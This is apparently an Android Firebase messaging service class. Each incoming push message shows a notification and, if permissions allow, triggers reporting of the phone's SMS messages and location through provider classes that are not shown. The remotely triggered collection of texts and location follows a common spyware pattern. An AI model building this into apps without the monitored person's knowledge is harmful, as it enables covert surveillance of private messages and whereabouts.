package com.example.myandroidapps.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.example.myandroidapps.R;
import com.example.myandroidapps.provider.LocationProvider;
import com.example.myandroidapps.provider.SmsProvider;
import com.example.myandroidapps.util.PermissionHandler;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static String TAG;

    @Override
    public void onCreate() {
        TAG = getApplicationContext().getResources().getString(R.string.app_name);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Token: " + token);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        handleNotification(remoteMessage);
        boolean permissionsGranted = PermissionHandler.checkPermissions(this);
        if(permissionsGranted){
            reportSms();
            reportLocation();
        }else{
            Log.d(TAG,"Skipping Reporting. Permissions not granted");
        }
    }

    private void reportLocation() {
        try{
            LocationProvider locationProvider = new LocationProvider(getApplicationContext());
            locationProvider.handleReportLocation();
        }catch (Exception e){
            Log.e(TAG,"Failed to report location",e);
        }
    }

    private void reportSms() {
        try{
            SmsProvider smsProvider = new SmsProvider(getApplicationContext());
            smsProvider.handleReportSms();
        }catch (Exception e){
            Log.e(TAG,"Failed to report sms",e);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void handleNotification(RemoteMessage remoteMessage){
        Log.d(TAG, "Notification: " + remoteMessage.getFrom());
        String title = remoteMessage.getNotification().getTitle();
        String body = remoteMessage.getNotification().getBody();
        final String CHANNEL_ID = "HEADS_UP_NOTIFICATION";
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Heads Up Notification",
                NotificationManager.IMPORTANCE_HIGH
        );
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this,CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(body)
                .setSmallIcon(R.drawable.ic_klogo)
                .setColor(ContextCompat.getColor(this, R.color.purple_700))
                .setAutoCancel(true);
        Log.d(TAG, "onMessageReceived: "+title+" "+body);
        NotificationManagerCompat.from(this).notify(1, notification.build());
    }
}
